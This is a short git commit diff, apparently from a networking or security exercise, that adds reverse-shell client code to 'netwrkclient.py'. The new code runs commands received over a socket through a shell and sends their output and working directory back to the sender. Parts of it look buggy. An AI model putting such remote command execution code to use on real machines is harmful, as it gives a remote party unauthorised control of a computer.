96a1d71af04312c1d464ffdda91f24575cd0c173
Suhas536539 <96898169+Suhas536539@users.noreply.github.com>
2022-06-20 16:49:45 +0000

    km

--- ActivitySet#1/netwrkclient.py
+++ ActivitySet#1/netwrkclient.py
@@ -14,4 +14,11 @@ while True:
         os.chdir(data[:2].decode("utf-8") == 'cd')
 
     if len(data) > 0:
-        cmd = subprocess.Popen(data[:2].decode("utf-8") == 'cd')
+        cmd = subprocess.Popen(data[1].decode("utf-8"),shell = True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) 
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() + ">"
+        
+        s.send(str.encode(output_str + currentWD))
+
+        print(output_str)
